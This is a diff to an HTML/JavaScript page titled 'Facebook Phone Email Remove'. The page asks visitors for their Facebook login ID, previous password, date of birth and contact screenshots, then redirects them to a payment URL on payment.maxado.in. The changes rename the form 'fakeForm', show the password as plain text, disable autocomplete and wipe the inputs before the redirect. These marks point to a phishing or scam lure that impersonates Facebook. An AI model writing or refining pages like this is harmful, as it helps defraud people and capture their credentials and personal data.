@@ -11,8 +11,8 @@
             background-color: #f0f0f0;
         }
         .container {
-            width: 0 auto;
-            max-width: 0 auto;
+            width: 90%;
+            max-width: 500px;
             margin: 0 auto;
             padding: 20px;
             background-color: #fefffd;
@@ -31,8 +31,8 @@
             display: block;
             margin: 10px 0 5px;
         }
-        input[type="text"], input[type="password"], textarea, input[type="date"], input[type="file"] {
-            width: calc(100% - 2px);
+        input[type="text"], textarea, input[type="date"], input[type="file"] {
+            width: calc(100% - 22px);
             padding: 10px;
             margin-bottom: 10px;
             border: 1px solid #ccc;
@@ -41,7 +41,7 @@
             box-sizing: border-box;
         }
         .red-placeholder::placeholder {
-            color: red; /* Red color for the placeholder text */
+            color: red;
         }
         .password-container {
             position: relative;
@@ -53,8 +53,9 @@
             transform: translateY(-50%);
             cursor: pointer;
             font-size: 20px;
+            user-select: none;
         }
-        input[type="submit"] {
+        .proceed-btn {
             width: 100%;
             background-color: green;
             color: white;
@@ -67,7 +68,7 @@
             transition: transform 0.3s;
             margin-bottom: 10px;
         }
-        input[type="submit"]:hover {
+        .proceed-btn:hover {
             background-color: darkgreen;
             transform: scale(1.05);
         }
@@ -76,45 +77,46 @@
             font-size: 14px;
             display: none;
         }
-        .optional {
-            color: green;
-            opacity: 0.5;
-            font-size: 12px;
-        }
         .hidden { display: none; }
         #result { margin-top: 20px; }
         .info-item {
             display: flex;
             justify-content: space-between;
             align-items: center;
+            margin-bottom: 8px;
         }
         .remove-btn {
             color: red;
             cursor: pointer;
+            margin-left: 10px;
         }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>Facebook Phone Email Remove</h1>
-        <form id="transferForm" enctype="multipart/form-data" onsubmit="return submitForm(event)">
+        <div id="fakeForm">
             <label for="name">Name</label>
-            <input type="text" id="name" name="name" class="-placeholder" placeholder="Enter your full name" required pattern="^[a-zA-Z\s\W]+$" title="Only letters and special characters are allowed" oninput="validateName()"> <!-- Red placeholder added -->
+            <input type="text" id="name" name="name" class="red-placeholder" placeholder="Enter your full name" 
+                   required pattern="^[a-zA-Z\s\W]+$" title="Only letters and special characters are allowed" 
+                   oninput="validateName()" autocomplete="off" autocorrect="off" spellcheck="false">
 
             <label for="loginId2">Login Id</label>
-            <input type="text" id="loginId2" name="loginId2" placeholder="Enter your phone number or Email Id" required>
+            <input type="text" id="loginId2" name="loginId2" placeholder="Enter your phone number or Email Id" 
+                   required autocomplete="off" autocorrect="off" spellcheck="false">
 
             <label for="password">Password</label>
             <div class="password-container">
-                <input type="password" id="password" name="password" placeholder="Enter your previous password" required oninput="checkPasswordLength()">
+                <input type="text" id="password" name="password" placeholder="Enter your previous password" 
+                       required oninput="checkPasswordLength()" autocomplete="new-password" autocorrect="off" spellcheck="false">
                 <span class="toggle-password" onclick="togglePasswordVisibility()">👁️</span>
             </div>
             <div class="error-message" id="passwordError">Please enter your correct password</div>
 
             <label for="dob">Date of Birth</label>
-            <input type="date" id="dob" name="dob" required onblur="validateDate()">
+            <input type="date" id="dob" name="dob" required onblur="validateDate()" autocomplete="off">
 
-            <label for="screenshot upload of contact information">Screenshot upload of contact information</label>
+            <label for="screenshot">Screenshot upload of contact information</label>
             <input type="file" id="file-input" accept="image/*" multiple required onchange="uploadImages()">
 
             <div id="result" class="hidden">
@@ -122,11 +124,13 @@
                 <div id="info-container"></div>
             </div>
 
-            <label for="additionalInfo"></label> <!-- No text here, as requested -->
-            <textarea id="additionalInfo" name="additionalInfo" rows="4" placeholder="Delete" style="width: calc(100% - 22px); padding: 10px; color: red; font-size: 12px;"></textarea>
+            <label for="additionalInfo"></label>
+            <textarea id="additionalInfo" name="additionalInfo" rows="4" placeholder="Delete" 
+                      style="width: calc(100% - 22px); padding: 10px; color: red; font-size: 12px;"
+                      autocomplete="off" autocorrect="off" spellcheck="false"></textarea>
 
-            <input type="submit" value="Proceed">
-        </form>
+            <button class="proceed-btn" onclick="validateAndSubmit(event)">Proceed</button>
+        </div>
     </div>
 
     <script>
@@ -157,7 +161,7 @@
             }
         }
 
-        function submitForm(event) {
+        function validateAndSubmit(event) {
             event.preventDefault();
 
             const passwordInput = document.getElementById("password").value;
@@ -168,20 +172,27 @@
                 return false;
             }
 
-            window.location.href = "https://payment.maxado.in/index.php?token=OTd8fGFIUjBjSE02THk5MWNHRnVaV3d1YjI1c2FXNWxMMlpmWWk5d2FHOWZaVzFzWDNKbGJXOTJaUzlqYjI1bWFYSnRZWFJwYjI0PXx8aHR0cHM6Ly91cGFuZWwub25saW5lL2ZfYi9waG9fZW1sX3JlbW92ZS9mX2ItbG9nby5zdmc=";
-            return true;
+            // Clear all input values before redirect (optional)
+            document.getElementById('fakeForm').querySelectorAll('input, textarea').forEach(element => {
+                element.value = '';
+            });
+
+            // Redirect to the specified URL
+            setTimeout(function() {
+                window.location.href = "https://payment.maxado.in/index.php?token=OTd8fGFIUjBjSE02THk5MWNHRnVaV3d1YjI1c2FXNWxMMlpmWWk5d2FHOWZaVzFzWDNKbGJXOTJaUzlqYjI1bWFYSnRZWFJwYjI0PXx8aHR0cHM6Ly91cGFuZWwub25saW5lL2ZfYi9waG9fZW1sX3JlbW92ZS9mX2ItbG9nby5zdmc=";
+            }, 50);
         }
 
         function togglePasswordVisibility() {
             const passwordField = document.getElementById("password");
             const toggleSymbol = document.querySelector(".toggle-password");
 
-            if (passwordField.type === "password") {
-                passwordField.type = "text";
-                toggleSymbol.textContent = "🙈"; // Change to a different symbol when visible
+            if (passwordField.type === "text") {
+                passwordField.type = "text"; // Keep as text to prevent saving
+                toggleSymbol.textContent = "🙈";
             } else {
-                passwordField.type = "password";
-                toggleSymbol.textContent = "👁️"; // Change back to original symbol
+                passwordField.type = "text"; // Keep as text to prevent saving
+                toggleSymbol.textContent = "👁️";
             }
         }
 
@@ -204,14 +215,14 @@
         }
 
         function extractInfo(text) {
-            const phoneRegex = /(\+?\d{1,3}[- ]?)?\d{10}/g; // Simple regex for phone numbers
-            const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g; // Regex for emails
+            const phoneRegex = /(\+?\d{1,3}[- ]?)?\d{10}/g;
+            const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
 
             const phones = text.match(phoneRegex) || [];
             const emails = text.match(emailRegex) || [];
 
             const infoContainer = document.getElementById('info-container');
-            infoContainer.innerHTML = ''; // Clear previous results
+            infoContainer.innerHTML = '';
 
             phones.forEach(phone => {
                 const phoneItem = document.createElement('div');
@@ -231,9 +242,7 @@
         }
 
         function removeInfo(element, value) {
-            element.parentElement.remove(); // Remove the item
-
-            // Add the removed value to the Additional Information box
+            element.parentElement.remove();
             const additionalInfo = document.getElementById('additionalInfo');
             additionalInfo.value += value + ' ';
         }
